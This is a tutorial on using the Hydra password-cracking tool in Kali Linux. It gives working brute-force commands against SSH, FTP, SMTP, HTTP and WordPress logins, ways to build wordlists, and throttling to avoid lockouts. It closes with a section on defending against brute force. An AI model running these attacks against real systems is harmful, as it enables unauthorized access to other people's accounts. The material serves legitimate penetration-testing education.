What is Hydra?

Hydra is a fast and flexible password-cracking tool that supports a wide range of protocols including FTP, SSH, Telnet, HTTP, HTTPS, SMB, and more. It is primarily used to perform dictionary-based brute-force attacks on login credentials.

Key Features

  • Support for over 50 protocols/services
  • Multi-threaded parallel connection capability
  • Flexible user/password list handling
  • Modular design with plug-in support
  • IPv6 support
  • Restore functionality for interrupted sessions
  • Free and open source software (FOSS)
⚠️ Warning: THC-Hydra is a powerful tool intended for legal security testing. Always ensure you have explicit permission to test any system you don't own. Unauthorized access attempts are illegal in most jurisdictions.

Installation in Kali Linux

Hydra comes pre-installed on Kali Linux. To ensure you have the latest version:

sudo apt update sudo apt install hydra

To verify your installation:

hydra -h

This will display the help menu with a list of supported protocols and basic usage information.

Basic Usage

The general syntax for Hydra is:

hydra [options] [protocol://target]

Common Options

Option Description
-l username Specify a single username
-L userlist.txt Specify a file containing multiple usernames
-p password Specify a single password
-P passlist.txt Specify a file containing multiple passwords
-C combo.txt Specify a file with username:password combinations
-t n Number of parallel connections (default: 16)
-s PORT Specify a non-default port
-v / -V Verbose / Very verbose mode
-o output.txt Write found credentials to file
-f Stop after finding first valid credentials

Examples

Brute-force an SSH login with a username and a password list:

hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

Brute-force an HTTP login form:

hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

Brute-force FTP service with multiple usernames and passwords:

hydra -L users.txt -P passwords.txt ftp://192.168.1.10

Attack a specific port (e.g., SMTP on port 587):

hydra -l admin -P passwords.txt smtp://192.168.1.10:587

Use a combo list of username:password pairs:

hydra -C combo_list.txt ssh://192.168.1.10

Advanced Usage

HTTP Form-Based Authentication

Web forms often require specific formatting. The general syntax is:

hydra [target] http-post-form "[path]:[form parameters]:[failed login identifier]"

For example, to attack a WordPress login form:

hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
Tip: To analyze a form's parameters, use your browser's developer tools (F12) and examine the network requests when submitting the form.

Using Proxy

To route your Hydra traffic through a proxy:

hydra -l admin -P passlist.txt http-proxy://192.168.1.10:3128 http-post-form "..."

Rate Limiting

Some services have rate limiting or lockout policies. Use these options to slow down attacks:

hydra -l user -P passlist.txt -t 1 -W 5 ssh://192.168.1.10

This uses 1 thread (-t 1) and waits 5 seconds between connection attempts (-W 5).

Restore Interrupted Session

If Hydra is interrupted, it creates a .restore file. To continue:

hydra -R

Practical Examples

Example 1: SSH Brute Force

Attempt to crack SSH on a local target using common usernames and passwords:

hydra -L common_users.txt -P top_passwords.txt ssh://192.168.1.5

This approach is useful in penetration testing scenarios where weak login credentials may be in use.

Example 2: SMTP Authentication

Test email server authentication with a list of potential credentials:

hydra -L users.txt -P passwords.txt smtp://mail.example.com -v

Example 3: WordPress Admin Panel

Attempt to find WordPress admin credentials:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"

Example 4: FTP with Known Username

When you know a valid username and need to find the password:

hydra -l ftpuser -P /usr/share/wordlists/fasttrack.txt ftp://192.168.1.5 -v

Creating Custom Wordlists

Effective password cracking often requires targeted wordlists. Here are some ways to create them:

Using Cewl to Generate Website-Specific Wordlists

CeWL can crawl a website and create a wordlist from its content:

cewl -d 2 -m 5 -w custom_wordlist.txt http://example.com

This crawls to a depth of 2, includes words of minimum length 5, and saves them to custom_wordlist.txt.

Password Mutations with John the Ripper

You can use John the Ripper's rules to create variations of existing passwords:

john --wordlist=base_list.txt --rules --stdout > mutated_list.txt
Pro Tip: Combine multiple approaches for more effective wordlists. Start with targeted words, add common passwords, and apply mutations to create a comprehensive custom list.

Defending Against Hydra Attacks

As a security professional, it's important to understand how to protect systems from brute force attacks:

  • Account Lockout Policies: Implement temporary or permanent lockouts after a specific number of failed attempts
  • Rate Limiting: Slow down authentication attempts from the same IP address
  • Two-Factor Authentication (2FA): Add a second authentication factor beyond passwords
  • Strong Password Policies: Enforce complex, long passwords that resist brute forcing
  • IP Blocking: Use tools like Fail2ban to automatically block IPs with suspicious activity
  • Non-Standard Ports: While security by obscurity isn't strong by itself, changing default ports adds a small layer of protection
  • Logging and Monitoring: Set up alerts for multiple failed login attempts

Troubleshooting Common Issues

High Failure Rate

If you're seeing too many failures despite known good credentials:

  • Reduce the number of threads using -t 4 or lower
  • Add a delay between attempts using -W 2 (2 second delay)
  • Verify your target is correctly specified, including protocol and port

HTTP Form Issues

For web form attacks:

  • Make sure you've correctly identified all required form fields
  • Check for CSRF tokens that might be required
  • Ensure you've correctly identified the failed login message
  • Try using -V (verbose mode) to see exactly what's being sent

Connection Problems

If you can't connect to the target:

  • Verify the target is online with a simple ping test
  • Confirm the service is running with nmap -p [port] [target]
  • Check for firewalls or IPS systems that might be blocking your attempts
